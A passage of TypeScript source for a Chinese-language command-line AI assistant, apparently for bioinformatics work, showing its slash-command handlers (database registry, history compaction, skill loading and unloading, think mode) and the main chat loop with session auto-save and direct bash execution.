          console.log(chalk.dim('\n  下载完成后使用 /db add <路径> 注册'));
          break;
        }

        default:
          console.log(`用法: /db <list|add|rm|scan|download>`);
          console.log(chalk.dim('  /db list              列出已注册数据库'));
          console.log(chalk.dim('  /db add <路径>        手动注册'));
          console.log(chalk.dim('  /db rm <id>           删除记录'));
          console.log(chalk.dim('  /db scan [目录]       自动扫描'));
          console.log(chalk.dim('  /db download [名称]   显示下载指南'));
      }
      break;
    }

    case 'compact': {
      const tokens = estimateTokens(history);
      if (history.length < 4) {
        console.log(chalk.dim('对话太短，无需压缩'));
        break;
      }
      console.log(chalk.dim(`当前对话约 ~${Math.round(tokens / 1000)}k tokens，正在压缩...`));
      try {
        const currentCfg = loadConfig();
        const recent = history.slice(-COMPACT_KEEP_RECENT);
        const old = history.slice(0, -COMPACT_KEEP_RECENT);
        if (old.length === 0) {
          console.log(chalk.dim('近期消息不足，无需压缩'));
          break;
        }
        const summary = await compactMessages(old, currentCfg);
        const newHistory: Message[] = [
          { role: 'user', content: `[对话历史摘要 — 请在此基础上继续]\n\n${summary}` },
          { role: 'assistant', content: '✓ 已理解之前的对话摘要，请继续。' },
          ...recent,
        ];
        const after = estimateTokens(newHistory);
        console.log(chalk.green(`✓ 压缩完成: ${history.length} 条消息 → ${newHistory.length} 条，~${Math.round(after / 1000)}k tokens`));
        return { injectHistory: newHistory };
      } catch (err) {
        console.error(chalk.red(`压缩失败: ${err instanceof Error ? err.message : String(err)}`));
      }
      break;
    }

    case 'skills': {
      // Show currently loaded skills in this session
      if (injectedSkills.size === 0) {
        console.log(chalk.dim('当前会话未加载任何 Skill'));
        console.log(chalk.dim('使用 /sk <关键词> 加载，或直接描述任务自动激活'));
      } else {
        console.log(chalk.bold(`\n当前已加载的 Skills (${injectedSkills.size} 个):\n`));
        for (const [id, name] of injectedSkills) {
          console.log(`  ${chalk.green('●')} ${chalk.cyan(id)}  ${chalk.dim('— ' + name)}`);
          console.log(chalk.dim(`       /unload ${id}  可卸载此 Skill`));
        }
        console.log();
        console.log(chalk.dim('提示: /clear 清空全部对话和 Skills | /unload <id> 卸载单个'));
      }
      break;
    }

    case 'unload': {
      if (!arg) {
        console.log('用法: /unload <skill-id>');
        console.log(chalk.dim('使用 /skills 查看当前已加载的 Skills'));
        break;
      }
      // Find the skill id (exact or partial match among loaded skills)
      const loadedIds = Array.from(injectedSkills.keys());
      const targetId = loadedIds.find((id) => id === arg || id.includes(arg));
      if (!targetId) {
        console.log(chalk.yellow(`未找到已加载的 Skill: "${arg}"`));
        console.log(chalk.dim('使用 /skills 查看当前已加载的 Skills'));
        break;
      }
      // Remove all messages injected by this skill from history
      const SKILL_MARKER = `[Skill 已加载: ${targetId}]`;
      let removed = 0;
      // Remove the user injection message and the assistant ack that follows it
      for (let i = history.length - 1; i >= 0; i--) {
        const content = typeof history[i].content === 'string' ? history[i].content as string : '';
        if (history[i].role === 'user' && content.startsWith(SKILL_MARKER)) {
          // Remove this message and the assistant ack right after it
          const toRemove = (i + 1 < history.length && history[i + 1].role === 'assistant') ? 2 : 1;
          history.splice(i, toRemove);
          removed += toRemove;
          break;
        }
      }
      injectedSkills.delete(targetId);
      console.log(chalk.green(`✓ Skill "${targetId}" 已卸载`));
      if (removed > 0) console.log(chalk.dim(`  已从对话历史中移除 ${removed} 条注入消息`));
      break;
    }

    case 'think': {
      const val = arg.toLowerCase();
      if (val === 'on' || val === '1' || val === 'true') {
        console.log(chalk.yellow('✓ 思考模式已开启 — 每条消息将附加 /think 前缀 (Qwen3)'));
        return { thinkMode: true };
      } else if (val === 'off' || val === '0' || val === 'false') {
        console.log(chalk.dim('✓ 思考模式已关闭'));
        return { thinkMode: false };
      } else {
        // Toggle
        const next = !thinkMode;
        console.log(next
          ? chalk.yellow('✓ 思考模式已开启 — 每条消息将附加 /think 前缀 (Qwen3)')
          : chalk.dim('✓ 思考模式已关闭'));
        return { thinkMode: next };
      }
    }

    case 'wf': // alias for /sk
    case 'sk': {
      if (!arg) {
        listSkills();
        break;
      }

      // 1. Exact / partial ID match → inject directly (no LLM needed)
      const allSkills = collectAllSkills();
      const idMatch = allSkills.find((e) => e.id === arg || e.id.startsWith(arg) || e.id.includes(arg));
      if (idMatch) {
        await injectSkill(idMatch.id, history, injectedSkills, rl);
        break;
      }

      // 2. Free-text description → LLM-powered recommendation
      const spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
      let si = 0;
      const spinTimer = setInterval(() => {
        process.stdout.write(`\r  ${chalk.cyan(spinner[si++ % spinner.length])} 正在用 AI 搜索最匹配的 Skills...`);
      }, 80);

      const llmRecs = await llmRecommendSkills(arg);
      clearInterval(spinTimer);
      process.stdout.write('\r' + ' '.repeat(50) + '\r'); // clear spinner line

      if (llmRecs.length === 0) {
        // LLM failed or returned nothing → fall back to keyword listing
        console.log(chalk.yellow('  AI 推荐暂时不可用，显示关键词匹配结果:'));
        listSkills(arg);
        break;
      }

      // Show ranked recommendations
      console.log(chalk.bold(`\n  AI 为您推荐以下 Skills (输入序号直接加载):\n`));
      llmRecs.forEach((r, i) => {
        const num = chalk.bold.cyan(`[${i + 1}]`);
        console.log(`  ${num} ${chalk.cyan(r.id)}`);
        console.log(`      ${chalk.dim(r.reason)}`);
      });
      console.log();
      console.log(chalk.dim('  输入序号 1-' + llmRecs.length + ' 加载，直接回车取消，或输入 /sk <id> 加载其他'));
      console.log();

      const choice = await question(rl, chalk.blue('  选择 › '));
      const choiceNum = parseInt(choice.trim(), 10);
      if (!isNaN(choiceNum) && choiceNum >= 1 && choiceNum <= llmRecs.length) {
        await injectSkill(llmRecs[choiceNum - 1].id, history, injectedSkills, rl);
      } else if (choice.trim() === '') {
        console.log(chalk.dim('  已取消'));
      } else {
        // User typed something else — treat as another /sk query
        console.log(chalk.dim(`  提示: 使用 /sk ${choice.trim()} 加载指定 Skill`));
      }
      break;
    }

    case 'cat': {
      // Categorized skill browser
      console.log(chalk.bold.cyan('\n─── Skill 分类目录 ────────────────────────────────────────'));
      console.log(chalk.dim('  使用 /sk <id> 激活技能  ·  使用 /sk <关键词> 搜索\n'));
      const byCategory: Record<string, SkillEntry[]> = {};
      // Group SKILL_ROUTES by category (these are the "smart-routable" ones)
      for (const route of SKILL_ROUTES) {
        (byCategory[route.category] ??= []).push({ id: route.id, dir: '', tag: route.tag });
      }
      for (const [catKey, meta] of Object.entries(SKILL_CATEGORIES)) {
        const items = byCategory[catKey];
        if (!items || items.length === 0) continue;
        console.log(`  ${meta.icon}  ${chalk.bold(meta.label)}`);
        for (const item of items) {
          const route = SKILL_ROUTES.find((r) => r.id === item.id)!;
          console.log(`     ${chalk.cyan(item.id)}  ${chalk.dim('— ' + route.name)}`);
        }
        console.log();
      }
      const routedIds = new Set(SKILL_ROUTES.map((r) => r.id));
      const allInstalled = collectAllSkills();
      const unrouted = allInstalled.filter((e) => !routedIds.has(e.id));
      if (unrouted.length > 0) {
        console.log(`  📦  ${chalk.bold('更多 Skills')}  ${chalk.dim(`(${unrouted.length} 个，使用关键词搜索)`)}`);
        console.log(chalk.dim('     /sk <关键词>，例: /sk ehr  /sk clinical  /sk imaging'));
        console.log();
      }
      break;
    }


    case 'cd': {
      if (!arg) {
        console.log('用法: /cd <路径>');
        break;
      }
      const target = resolve(arg.replace(/^~/, homedir()));
      if (!existsSync(target)) {
        console.log(chalk.red(`路径不存在: ${target}`));
        break;
      }
      process.chdir(target);
      console.log(chalk.green(`✓ 工作目录已切换: ${process.cwd()}`));
      break;
    }

    case 'cwd':
      console.log(`当前工作目录: ${chalk.cyan(process.cwd())}`);
      break;

    case 'tools':
      console.log(chalk.bold('AI 可调用的工具:'));
      console.log(`  ${chalk.cyan('bash')}          执行 Shell 命令 (R/Python/bash 脚本、生信工具) — 实时流式输出`);
      console.log(`  ${chalk.cyan('read_file')}     读取文件内容 (支持 ~/ 路径，默认 500 行)`);
      console.log(`  ${chalk.cyan('write_file')}    创建或覆写文件`);
      console.log(`  ${chalk.cyan('list_dir')}      列出目录内容`);
      console.log(`  ${chalk.cyan('search_files')}  glob 搜索文件 (如 *.R, *.csv)`);
      console.log(`  ${chalk.cyan('fetch_geo')}     查询 NCBI GEO 数据库 (GSE/GDS/GPL/GSM 编号)`);
      console.log();
      console.log(chalk.dim('提示: 直接描述任务，AI 会自动决定调用哪个工具'));
      break;

    case 'help':
      printHelp();
      break;

    default:
      console.log(chalk.yellow(`未知命令: /${cmd}。输入 /help 查看全部命令`));
  }

  return {};
}

// ── Main loop ─────────────────────────────────────────────────────────────────

async function main(): Promise<void> {
  installBundledData(); // copy bundled workflows/tools/skills to ~/.bgicli/ if needed
  printBanner();
  await checkAndAutoUpdate().catch(() => {}); // check npm for newer version and auto-install

  const rl = createInterface({
    input: process.stdin,
    output: process.stdout,
    terminal: true,
    historySize: 100,
  });

  rl.on('close', () => {
    console.log(chalk.dim('\n再见！'));
    process.exit(0);
  });
  process.on('SIGINT', () => rl.close());

  await firstRunIfNeeded(rl);

  // Startup status panel
  const cfg = loadConfig();
  const prov = PROVIDERS[cfg.provider];
  const totalSkills = collectAllSkills().length;

  console.log(chalk.bold.cyan('─────────────────────────────────────────────────────────'));
  console.log(`  ${chalk.bold('服务商:')}  ${prov?.name ?? cfg.provider}`);
  console.log(`  ${chalk.bold('模型:')}    ${chalk.green(cfg.model)}`);
  console.log(`  ${chalk.bold('Skills:')}  ${totalSkills > 0 ? chalk.green(`${totalSkills} 个`) : chalk.yellow('未安装')}  ${chalk.dim('(/sk 搜索  /cat 分类目录)')}`);
  console.log(`  ${chalk.bold('工具:')}    bash · read_file · write_file · list_dir · search_files`);
  console.log(`  ${chalk.bold('新功能:')}  /sessions /resume /checkpoint /run /check-env /install /diff`);
  console.log(chalk.bold.cyan('─────────────────────────────────────────────────────────'));
  // Show last session hint
  const lastSess = getLastSession();
  if (lastSess) {
    const age = (() => {
      const diff = Date.now() - new Date(lastSess.updatedAt).getTime();
      const h = Math.floor(diff / 3_600_000);
      const d = Math.floor(diff / 86_400_000);
      return d > 0 ? `${d}天前` : h > 0 ? `${h}小时前` : '刚刚';
    })();
    console.log(chalk.dim(`  上次会话: ${lastSess.id}  ${age}  /resume 恢复`));
  }
  console.log(chalk.dim('  输入问题开始对话   /help 查看命令   /cat 技能分类   @文件路径 内嵌文件'));
  console.log();

  let dbRegistry = loadDbRegistry();
  let systemPrompt = buildSystemPrompt(buildDbPromptSection(dbRegistry));
  let history: Message[] = [];
  let thinkMode = false;
  const injectedSkills = new Map<string, string>(); // id → display name

  // ── Session init ────────────────────────────────────────────────────────────
  const sessionId = newSessionId();
  const sessionCreatedAt = new Date().toISOString();
  // Attach session metadata to cfg object (passed through handleCommand)
  SESSION_CTX.id = sessionId;
  SESSION_CTX.createdAt = sessionCreatedAt;

  // ── Workdir snapshot ────────────────────────────────────────────────────────
  const wdirSnapshot = snapshotWorkdir(process.cwd());
  SESSION_CTX.wdirSnapshot = wdirSnapshot;

  // Auto-save session after each AI reply
  function autoSaveSession(): void {
    if (history.length === 0) return;
    try {
      saveSession(sessionId, sessionCreatedAt, history, Array.from(injectedSkills.keys()), sessionCreatedAt);
    } catch { /* non-fatal */ }
  }

  // Auto-checkpoint after successful bash tool execution (tracked via message count)
  let lastCheckpointMsgCount = 0;
  const CHECKPOINT_INTERVAL = 6; // save checkpoint every ~3 turns (6 messages)

  while (true) {
    let input: string;
    const thinkIndicator = thinkMode ? chalk.yellow('[思考]') + ' ' : '';
    try {
      input = await question(rl, thinkIndicator + chalk.blue('你 › '));
    } catch {
      break;
    }

    const trimmed = input.trim();
    if (!trimmed) continue;

    if (['exit', 'quit', 'q', '/exit', '/quit'].includes(trimmed.toLowerCase())) {
      console.log(chalk.dim('再见！'));
      rl.close();
      break;
    }

    if (trimmed.startsWith('/')) {
      const result = await handleCommand(trimmed, rl, history, thinkMode, injectedSkills);
      if (result.exit) break;
      if (result.clearHistory) { history = []; injectedSkills.clear(); }
      if (result.injectHistory) history = result.injectHistory;
      if (result.thinkMode !== undefined) thinkMode = result.thinkMode;
      continue;
    }

    // ── ! prefix: bypass LLM, execute bash directly ────────────────────────────
    if (trimmed.startsWith('!')) {
      const cmd = trimmed.slice(1).trim();
      if (!cmd) {
        console.log(chalk.yellow('用法: !<命令>  例: !ls -la  !Rscript analysis.R  !python script.py'));
        continue;
      }
      console.log(chalk.dim(`[直接执行] ${cmd}`));
      const t0 = Date.now();
      const result = await executeTool('bash', { command: cmd }, (chunk) => {
        process.stdout.write(chalk.dim('  │ ') + chunk);
      });
      const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
      if (result.error) {
        console.log(chalk.yellow(`\n  ✗ ${result.error} ${chalk.dim('(' + elapsed + 's)')}`));
      } else {
        console.log(chalk.green(`\n  ✓ 完成 ${chalk.dim('(' + elapsed + 's)')}`));
      }
      console.log();
      continue;
    }

    // ── Auto skill routing ─────────────────────────────────────────────────────
    const { routes: suggestedRoutes, topScore } = routeSkill(trimmed);
    const newRoutes = suggestedRoutes.filter((r) => !injectedSkills.has(r.id));
    if (newRoutes.length === 1 && topScore >= 8) {
      // High-confidence single match → auto-inject silently
      const r = newRoutes[0];
      const ok = await injectSkill(r.id, history, injectedSkills, rl, true);
      if (ok) {
        console.log(chalk.dim('  (提示: /clear 可清除上下文后切换 Skill)'));
      }
    } else if (newRoutes.length >= 2 && topScore >= 4) {
      // Multiple candidates → show suggestions, let user choose
      console.log(chalk.dim('\n💡 检测到相关技能，输入 /sk <id> 激活:'));
      newRoutes.slice(0, 3).forEach((r) => {
        console.log(chalk.dim(`   /sk ${r.id}  — ${r.name}`));
      });
      console.log();
    }

    // Expand @file references
    const expanded = expandFileRefs(trimmed);
    const userContent = thinkMode ? `/think\n${expanded}` : expanded;

    history.push({ role: 'user', content: userContent });

    try {
      const currentCfg = loadConfig();
      const reply = await chat(history, currentCfg, systemPrompt);
      history.push({ role: 'assistant', content: reply });
      history = await maybeCompact(history, currentCfg);

      // ── Auto-save session ─────────────────────────────────────────────────
      autoSaveSession();

      // ── Auto-checkpoint every N messages ──────────────────────────────────
      if (history.length - lastCheckpointMsgCount >= CHECKPOINT_INTERVAL) {
        const label = `第 ${Math.floor(history.length / 2)} 轮`;
        saveCheckpoint(sessionId, label, history, Array.from(injectedSkills.keys()));
        lastCheckpointMsgCount = history.length;
      }

      // ── Show active Skills footer ──────────────────────────────────────────
      if (injectedSkills.size > 0) {
        const ids = Array.from(injectedSkills.keys()).join(' · ');
        console.log(chalk.dim(`\n  [激活 Skill: ${ids}]`));
      }
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      console.error(chalk.red(`\n错误: ${msg}\n`));
      history.pop();
    }

    console.log();
  }
}

// ── Util ──────────────────────────────────────────────────────────────────────

function question(rl: readline.Interface, prompt: string): Promise<string> {
  return new Promise((resolve, reject) => {
    rl.question(prompt, resolve);
    rl.once('close', () => reject(new Error('closed')));
  });
}

main().catch((err: unknown) => {
  console.error(chalk.red('Fatal:', err instanceof Error ? err.message : String(err)));
  process.exit(1);
});
